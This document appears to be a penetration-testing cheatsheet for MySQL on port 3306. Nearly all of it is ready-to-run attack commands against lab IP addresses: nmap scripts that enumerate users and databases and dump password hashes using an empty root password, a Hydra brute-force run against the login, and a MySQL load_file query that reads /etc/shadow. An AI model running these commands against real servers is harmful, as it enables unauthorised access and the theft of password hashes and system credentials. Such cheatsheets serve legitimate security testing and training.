---
description: Cheatsheets for MySQL
---

# 3306 - Pentesting MySQL

### Nmap

```bash
nmap -sV 192.71.145.3
```

#### Nmap Script

```bash
#Check whether anonymous login is allowed on MySQL Server.
nmap --script=mysql-empty-password -p 3306 192.71.145.3
#Check whether “InteractiveClient” capability is supported on the MySQL server.
nmap --script=mysql-info -p 3306 192.71.145.3
#Enumerate the users present on MySQL database server using mysql-users nmap script.
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
#List all databases stored on the MySQL Server using nmap script.
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
#Find the data directory used by mysql server using nmap script.
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
#Check whether File Privileges can be granted to non admin users using mysql-audit
nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.71.145.3
#Dump all user hashes using nmap script
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.71.145.3
#Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 192.71.145.3
```

### Hydra

```bash
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.149.194.3 mysql
```

### MySQL

```bash
mysql -h 192.71.145.3 -u root
#Navigating Example
show databases;
use books;
show tables;
select * from authors;
#Find the system password hash for user "root".
mysql -h 192.71.145.3 -u root
select load_file("/etc/shadow")
```
